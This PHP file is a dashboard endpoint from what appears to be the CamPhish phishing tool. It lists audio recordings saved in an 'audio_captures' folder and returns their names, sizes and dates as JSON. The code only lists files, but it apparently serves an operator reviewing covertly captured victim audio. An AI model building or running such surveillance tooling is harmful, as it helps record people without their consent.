<?php
/**
 * CamPhish Dashboard API - Get Audio
 * Author: Rahul Kushwaha
 * Returns audio file information
 */

header('Content-Type: application/json');
header('Cache-Control: no-cache, must-revalidate');

// Base path to the root CamPhish directory (relative to this API file location)
$basePath = dirname(dirname(__DIR__));

$audioFiles = [];

// Get audio webm files
$files = glob($basePath . '/audio_captures/*.webm');

if (is_array($files) && count($files) > 0) {
    foreach ($files as $file) {
        if (!is_readable($file)) {
            continue;
        }
        
        $filename = basename($file);
        $size = filesize($file);
        $date = filemtime($file);
        
        $audioFiles[] = [
            'filename' => $filename,
            'size' => $size,
            'sizeFormatted' => formatFileSize($size),
            'date' => date('Y-m-d H:i:s', $date),
            'unixTimestamp' => $date
        ];
    }
    
    // Sort by date descending (newest first)
    usort($audioFiles, function($a, $b) {
        return $b['unixTimestamp'] <=> $a['unixTimestamp'];
    });
}

echo json_encode($audioFiles);

/**
 * Format file size to human readable format
 */
function formatFileSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } else {
        return $bytes . ' bytes';
    }
}
